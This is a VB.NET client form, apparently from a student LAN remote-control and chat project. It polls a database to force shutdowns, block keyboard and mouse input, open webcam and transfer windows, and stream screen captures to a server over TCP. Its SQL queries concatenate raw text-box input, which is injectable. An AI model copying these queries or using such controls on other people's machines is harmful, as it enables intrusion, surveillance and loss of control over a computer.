Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Public Class Form1

    Public PortDesktop As String = 21114
    Public PortEscritorio As String = 21111
    Public PortMensaje As String = 21112
    Public PortWebcam As String = 21113

    Dim YO As New TcpClient
    Dim NS As NetworkStream
    Dim PANTALLA As String = "COMPLETA"

    'mas servicios
    Private psi As ProcessStartInfo
    Private cmd As Process
    Private Delegate Sub InvokeWithString(ByVal text As String)

    Declare Function BlockInput Lib "User32" (ByVal fBlockIt As Boolean) As Boolean 'A PARTIR DE VISTA SOLO SI SE EJECUTA COMO ADMINISTRADOR

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        conectarme()
        getIpconfig()
    End Sub

    Private Sub insertUser(sender As Object, e As KeyEventArgs) Handles txtMensaje.KeyDown
        Try
            If e.KeyCode = Keys.Enter Then
                If (txtUsuario.Text <> "" And txtIp.Text <> "" And txtMensaje.Text <> "" And txtIpServidor.Text <> Nothing) Then
                    ejecutar("INSERT control VALUES(DEFAULT,'" & txtUsuario.Text & "','" & txtIp.Text & "','" & lblCliente.Text & "','" & txtMensaje.Text & "',0,0,0,0,0,0);")
                    lblNotificacion.Text = "Mensaje Enviado Correctamente"
                    Panel1.Visible = True
                    leerRene.Close()
                    txtUsuario.Enabled = False
                    txtIp.Enabled = False
                    txtMensaje.Text = ""
                    timerChatGeneral.Start()
                Else
                    MessageBox.Show("Oye debes de llenar los campos requeridos")
                    lblNotificacion.Text = "Oye debes de llenar los campos requeridos"
                End If
            End If
        Catch ex As Exception
            MessageBox.Show("Ocurrio un error en la conexion o la consulta" & ex.Message())
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles timerChatGeneral.Tick
        Try
            llenaLista(listChatGlobal, "SELECT CONCAT(UPPER(nombreUsuario),' => ',mensajeUsuario)AS MENSAJE FROM control;")
            lblNotificacion.Text = ""
            getDataCLient()
        Catch ex As Exception
            MsgBox("No se pudo leer los mensajes del chat global " & ex.Message())
        End Try
    End Sub

    Public Sub getDataCLient()
        Try
            'Get status client
            ejecutar("SELECT estadoUsuario FROM control WHERE ipUsuario = '" & txtIp.Text & "' AND nombreUsuario = '" & txtUsuario.Text & "' LIMIT 1")
            If leerRene.Read() Then
                If leerRene(0).ToString() = "0" Then
                    lblEstado.Text = "DESACTIVADO"
                Else
                    lblEstado.Text = "ACTIVADO"
                    detenerServicion()
                    ESCRITORIO.Show()
                End If
            End If
            leerRene.Close()
            'Get status apagado
            ejecutar("SELECT apagar FROM control WHERE ipUsuario = '" & txtIp.Text & "' AND nombreUsuario = '" & txtUsuario.Text & "' LIMIT 1")
            If leerRene.Read() Then
                If leerRene(0).ToString() = "0" Then
                    lblApagado.Text = "DESACTIVADO"
                    Process.Start("shutdown", "/a")
                Else
                    lblApagado.Text = "APAGAR"
                    Process.Start("shutdown", "/s /t 60 /f")
                End If
            End If
            leerRene.Close()
            'Get status bloqueo
            ejecutar("SELECT bloquear FROM control WHERE ipUsuario = '" & txtIp.Text & "' AND nombreUsuario = '" & txtUsuario.Text & "' LIMIT 1")
            If leerRene.Read() Then
                If leerRene(0).ToString() = "0" Then
                    lblBloqueo.Text = "DESACTIVADO"
                    'Desbloquea mouse y teclado
                    BlockInput(False)
                    lblbloquetrue.Text = ""
                Else
                    lblBloqueo.Text = "ACTIVADO"
                    lblbloquetrue.Text = "ESTAS BLOQUEADO"
                    'Bloquea mouse y teclado
                    BlockInput(True)
                End If
            End If
            leerRene.Close()
            'Get status transferir
            ejecutar("SELECT transferir FROM control WHERE ipUsuario = '" & txtIp.Text & "' AND nombreUsuario = '" & txtUsuario.Text & "' LIMIT 1")
            If leerRene.Read() Then
                If leerRene(0).ToString() = "0" Then
                    lblTransferir.Text = "DESACTIVADO"
                Else
                    lblTransferir.Text = "ACTIVADO"
                    TRANSFERIR.Show()
                End If
            End If
            leerRene.Close()
            'Get status mensajes
            ejecutar("SELECT mensaje FROM control WHERE ipUsuario = '" & txtIp.Text & "' AND nombreUsuario = '" & txtUsuario.Text & "' LIMIT 1")
            If leerRene.Read() Then
                If leerRene(0).ToString() = "0" Then
                    lblMensaje.Text = "DESACTIVADO"
                Else
                    lblMensaje.Text = "ACTIVADO"
                    MENSAJE.Show()
                End If
            End If
            leerRene.Close()
            'Get status webcam
            ejecutar("SELECT webcam FROM control WHERE ipUsuario = '" & txtIp.Text & "' AND nombreUsuario = '" & txtUsuario.Text & "' LIMIT 1")
            If leerRene.Read() Then
                If leerRene(0).ToString() = "0" Then
                    lblWebcam.Text = "DESACTIVADO"
                Else
                    lblWebcam.Text = "ACTIVADO"
                    WEBCAM.Show()
                End If
            End If
            leerRene.Close()
        Catch ex As Exception
            MsgBox("Error al obtener los datos :  " & ex.Message())
        End Try
    End Sub

    Private Sub irServidor(sender As Object, e As EventArgs) Handles pictureServer.DoubleClick

    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub btnConectar_Click(sender As Object, e As EventArgs) Handles btnConectar.Click
        conectarServicio()
    End Sub


    'Demas servicios para enviar
    Public Sub conectarServicio()
        Try
            YO.Connect(txtIpServidor.Text, PortDesktop)
            Timer1.Start()
            LabelCONEXION.Text = "CONECTADO"
            If PANTALLA = "COMPLETA" Then
                Me.WindowState = FormWindowState.Minimized
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick_1(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim BF As New BinaryFormatter
        Dim IMAGEN As Bitmap
        If PANTALLA = "ZONA" Then
            Try
                IMAGEN = New Bitmap(LabelESCRITORIO.Width, LabelESCRITORIO.Height)
                Dim DIBUJO As Graphics = Graphics.FromImage(IMAGEN)
                DIBUJO.CopyFromScreen(Me.Location.X + LabelESCRITORIO.Location.X + 8,
                                      Me.Location.Y + LabelESCRITORIO.Location.Y + 30, 0, 0, LabelESCRITORIO.Size)
                NS = YO.GetStream
                BF.Serialize(NS, IMAGEN)
            Catch ex As Exception
                Timer1.Stop()
                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                LabelCONEXION.Text = "DESCONECTADO"
            End Try
        Else
            Try
                Dim BM As Bitmap
                BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                Dim DIBUJO As Graphics
                DIBUJO = Graphics.FromImage(BM)
                DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
                DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)

                'AÑADE EL CURSOR
                IMAGEN = New Bitmap(BM)
                Dim DIBUJO2 As Graphics
                DIBUJO2 = Graphics.FromImage(IMAGEN)
                Dim MICURSOR As Cursor = Cursors.Hand
                Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
                MICURSOR.Draw(DIBUJO2, RECTANGULO)
                NS = YO.GetStream
                BF.Serialize(NS, IMAGEN)
            Catch ex As Exception
                Timer1.Stop()
                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                LabelCONEXION.Text = "DESCONECTADO"
            End Try
        End If
    End Sub

    Public Sub detenerServicion()
        'Detener otros servicios
        Try
            NS.Dispose()
            YO.Close()
        Catch ex As Exception
        End Try
        Timer1.Stop()
    End Sub

    Public Sub getIpconfig()
        Dim comando As String
        comando = "ipconfig"
        If comando.Contains(" ") Then
            psi = New ProcessStartInfo(comando.Split(" ")(0), comando.Split(" ")(1))
        Else
            psi = New ProcessStartInfo(comando$)
        End If
        Dim systemencoding As System.Text.Encoding
        System.Text.Encoding.GetEncoding(Globalization.CultureInfo.CurrentUICulture.TextInfo.OEMCodePage)
        With psi
            .UseShellExecute = False
            .RedirectStandardError = True
            .RedirectStandardOutput = True
            .RedirectStandardInput = True
            .CreateNoWindow = True
            .StandardOutputEncoding = systemencoding
            .StandardErrorEncoding = systemencoding
        End With
        cmd = New Process With {.StartInfo = psi, .EnableRaisingEvents = True}
        AddHandler cmd.ErrorDataReceived, AddressOf este
        AddHandler cmd.OutputDataReceived, AddressOf este
        cmd.Start()
        cmd.BeginOutputReadLine()
        cmd.BeginErrorReadLine()
        For z As Integer = 1 To 100
            z += 1
        Next
    End Sub
    Private Sub este(ByVal sender As Object, ByVal e As DataReceivedEventArgs)
        Me.Invoke(New InvokeWithString(AddressOf esteNo), e.Data)
    End Sub
    Private Sub esteNo(ByVal text As String)
        TextBox8.AppendText(text & Environment.NewLine)
        TextBox8.ScrollToCaret()
    End Sub

    Private Sub txtIp_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles txtIp.MouseDoubleClick
        Dim x As Integer
        For x = 1 To 10
        Next
        Dim tercero As Integer
        Dim cortado As Integer
        Dim segundo As String
        Dim cuarto As String
        Dim quinto As Integer
        Dim sexto As String
        Dim puerta As String = "192.168.1.254"
        cortado = InStr(TextBox8.Text, "Adaptador de LAN inal mbrica Wi-Fi:")
        segundo = Mid(TextBox8.Text, cortado)
        tercero = InStr(segundo, "IPv4. . . . . . . . . . . . . . : ")
        cuarto = Mid(segundo, tercero + 34)
        quinto = InStr(cuarto, "M scara de subred")
        sexto = Mid(cuarto, 1, 15)
        sexto = sexto.Replace(" ", "")
        txtIp.Text = sexto
    End Sub
End Class

